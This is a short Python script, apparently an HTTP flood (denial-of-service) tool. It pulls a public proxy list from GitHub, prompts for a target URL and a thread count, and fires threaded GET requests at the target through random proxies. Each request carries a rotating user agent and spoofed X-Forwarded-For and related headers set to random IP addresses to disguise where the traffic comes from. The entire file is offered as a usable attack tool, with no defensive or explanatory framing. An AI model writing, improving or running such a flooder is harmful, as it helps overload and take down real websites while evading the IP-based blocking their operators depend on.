import requests
import random
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
import threading

inf=1000000000000

sn = [SoftwareName.CHROME.value]
os = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
rotator = UserAgent(software_names=sn, operating_systems=os, limit=inf)

req = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
r = requests.get(req)
with open('proxy.txt', 'w') as f:
    f.write(r.text)
    print('The proxies have been saved to proxy.txt in File')

target = input("Target: ")
threadcount = input("Threads: ")

proxyraw = [line.rstrip('\n') for line in open("proxy.txt")]
def httpget():
    try:
        proxy = random.choice(proxyraw)
        proxies = {
            "http": "http://"+proxy
        }
        ua = rotator.get_random_user_agent()
        randip = ".".join(map(str, (random.randint(0, 255) 
                                for _ in range(4))))
        headers={
        "X-Forwarded-For":randip,
        "X-Originating-IP":randip,
        "X-Remote-IP":randip,
        "X-Remote-Addr":randip,
        "User-Agent":ua,
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "Keep-Alive"
        }
        requests.get(target, headers=headers, proxies=proxies)
        print(proxies)
    except Exception as e:
        print(e)

def threader():
    global threads
    threads=[]
    for i in range(int(threadcount)):
        t=threading.Thread(target=httpget)
        threads.append(t)
        t.start()
threader()
